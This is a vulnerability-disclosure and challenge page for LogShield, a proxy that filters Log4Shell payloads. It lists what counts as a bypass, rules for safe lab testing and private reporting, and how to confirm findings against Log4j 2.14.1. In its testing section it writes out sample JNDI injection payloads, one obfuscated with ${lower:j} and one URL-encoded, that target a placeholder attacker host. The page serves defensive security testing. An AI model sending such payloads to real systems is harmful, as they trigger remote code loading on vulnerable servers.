# Break LogShield

LogShield claims to stop Log4Shell payloads that a plain `jndi:` search misses. A
claim like that is only worth something once someone other than the author has
tried hard to break it. This page invites you to try, tells you exactly what
counts, and shows the fastest way to test an idea.

If you find a way past it, you help make a security control better. If you do
not, that is a useful data point too, and I would like to hear about it.

## The goal

Get a request past LogShield in block mode that a **real vulnerable Log4j 2.14.1
would still act on**: it resolves a JNDI lookup (or, for the denial-of-service
tracks below, the engine or proxy misbehaves). Nothing else counts, because a
payload Log4j ignores is not an attack.

## What counts

| Track | You win when | Example of a valid report |
|---|---|---|
| **Detection bypass** | Real Log4j 2.14.1 attempts a JNDI lookup for your request, and the engine's verdict is below `malicious` (the lab calls this a `MISS`, or a `LEAK` through the proxy). | An encoding, nesting or request-structure trick the engine does not model. |
| **Parser differential** | The bytes LogShield forwards are not the bytes it inspected. | A request that is read one way by the proxy and another way by the backend. |
| **Engine denial of service** | A small input makes decoding or evaluation use unbounded CPU, memory or time. | Something that gets past the resource budgets. |
| **False positive** | A clearly legitimate request is blocked in the default configuration. | A normal header or body that trips a rule. This is a real cost, so it is welcome. |

## What does not count

- Anything that needs a non-default, explicitly insecure configuration.
- Payloads that Log4j 2.14.1 does not act on. These are the "over-blocks" in the
  [lab report](lab-report.md): LogShield blocks some of them on purpose.
- Non-JNDI lookups such as `${env:...}` that are only *suspicious*. By design the
  default forwards suspicious requests and `-block-suspicious` blocks them
  ([the policy question](lab.md#the-policy-question-suspicious-requests)).
- Attacks that never pass through the proxy (a documented limit in the
  [threat model](threat-model.md)).
- Vulnerabilities in Log4j itself or in your own application.

## Rules

1. **Test only your own machines.** Run everything in a lab you control. Never
   aim a payload at a system that is not yours.
2. **Keep payloads inert.** Use reserved names such as `attacker.invalid`,
   `example.com` or `192.0.2.1`. The lab's canary refuses every lookup and
   sends nothing anywhere.
3. **Report privately.** Use
   [GitHub private vulnerability reporting](https://github.com/TurlaFSB/logshield/security/advisories/new),
   as described in [SECURITY.md](../SECURITY.md). Please do not post a working
   bypass publicly before it is fixed.

## The fastest way to test an idea (about five minutes)

You do not need a lab to *explore*. Download a release, or build from source
(`make build`), and ask the engine directly:

```sh
./bin/logshield check '${${lower:j}ndi:ldap://attacker.invalid/a}'
./bin/logshield check -in query '%24%7Bjndi:ldap://attacker.invalid/a%7D'
./bin/logshield check -in body -json "$(cat my-idea.txt)"
```

`check` prints the verdict and exits `0` clean, `3` suspicious, `4` malicious. If
you can make it say **clean** or **suspicious** for something you believe Log4j
would still resolve, you have a candidate. The known tricks are already in the
[bypass corpus](../corpus/bypass) (165 entries in 14 classes): look there first so
you do not repeat them.

## Confirming a candidate against real Log4j

A candidate is only a bypass once real Log4j resolves it. The lab does exactly
that, safely: it runs Log4j 2.14.1 with a hook that records every JNDI name it
tries and refuses to resolve it. Set it up with [docs/lab.md](lab.md) (a Linux VM
with no route to anything you care about). Then:

1. Copy the `corpus/` directory and add your payload as a JSON Lines entry in
   `bypass/` (the format is in [corpus/README.md](../corpus/README.md)).
2. Run `./run.sh run -- -corpus /path/to/your/corpus`.
3. If the report shows a `MISS` or a `LEAK` for your entry, send me that entry and
   the report line.

You can send a candidate before confirming it. Say so, and I will confirm it in
the lab.

## What you get

- **Credit.** Your name or handle goes in the release notes, in the advisory and
  next to the regression entry, unless you prefer to stay anonymous.
- **A fix and a test.** Every confirmed bypass becomes a failing test, a fix and
  a permanent corpus entry, so it can never come back unnoticed.
- **A CVE** through GitHub's advisory process when the issue affects a released
  version ([SECURITY.md](../SECURITY.md)).
- A note in [assurance.md](assurance.md) that independent testing happened.

LogShield is a student-maintained open-source project, so there is no cash
bounty. Response targets are a first answer within 7 days and an assessment
within 14.

## Results so far

No independent report has been received yet. When one arrives, the outcome goes
here, whether it was a bypass, a false positive or a clean failure to break it.
